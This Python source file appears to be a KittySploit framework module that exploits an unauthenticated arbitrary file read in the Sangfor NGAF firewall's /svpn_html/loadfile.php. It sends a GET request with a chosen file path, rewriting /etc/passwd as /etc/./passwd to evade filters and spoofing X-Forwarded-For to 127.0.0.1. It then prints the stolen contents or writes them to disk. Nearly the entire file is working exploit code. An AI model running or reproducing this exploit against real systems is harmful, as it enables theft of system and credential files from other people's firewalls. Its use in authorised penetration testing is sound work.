#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Sangfor NGAF loadfile.php arbitrary file read."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.lfi import Lfi


class Module(Auxiliary, Http_client, Lfi):
    __info__ = {
        'name': 'Sangfor NGAF - loadfile.php File Read',
        'description': (
            'Reads arbitrary files via Sangfor Next Gen Application Firewall '
            '/svpn_html/loadfile.php file parameter.'
        ),
        'author': ['KittySploit Team'],
        'platform': Platform.LINUX,
        'references': [
            'https://labs.watchtowr.com/yet-more-unauth-remote-command-execution-vulns-in-firewalls-sangfor-edition/',
        ],
        'tags': ['sangfor', 'ngaf', 'firewall', 'lfi', 'file-read', 'unauth'],
        'agent': {
            'risk': 'intrusive',
            'effects': ['data_exfiltration'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': True,
            'produces': ['risk_signals'],
            'chain': {
                'produces_capabilities': [{'capability': 'file_read', 'from_detail': ''}],
                'suggested_followups': ['scanner/http/sangfor_ngaf_lfi_detect'],
            },
        },
    }

    file_read = OptString('/etc/passwd', 'Absolute remote file path to read', required=True)
    output_file = OptString('', 'Local file to write retrieved content', required=False)
    output_limit = OptInteger(12000, 'Max chars to print when output_file empty (0=full)', required=False, advanced=True)
    forwarded_for = OptString('127.0.0.1', 'X-Forwarded-For header value', required=False, advanced=True)

    def execute(self, file_path: str) -> str:
        remote = str(file_path or '').strip()
        if not remote.startswith('/'):
            remote = '/' + remote
        # Scanner uses /etc/./passwd to bypass naive filters.
        if remote == '/etc/passwd':
            remote = '/etc/./passwd'
        path = f'/svpn_html/loadfile.php?file={remote}'
        r = self.http_request(
            method='GET',
            path=path,
            headers={'X-Forwarded-For': str(self.forwarded_for or '127.0.0.1')},
            allow_redirects=False,
        )
        return (r.text or '') if r else ''

    def run(self):
        target = str(self.file_read or '/etc/passwd')
        print_status(f'Reading {target} via Sangfor NGAF loadfile.php ...')
        body = self.execute(target)
        if not body:
            print_error('Empty response')
            return False
        out = str(self.output_file or '').strip()
        if out:
            with open(out, 'w', encoding='utf-8', errors='replace') as fh:
                fh.write(body)
            print_success(f'Wrote {len(body)} bytes to {out}')
        else:
            limit = int(self.output_limit or 0)
            print_info(body if limit <= 0 else body[:limit])
        return True
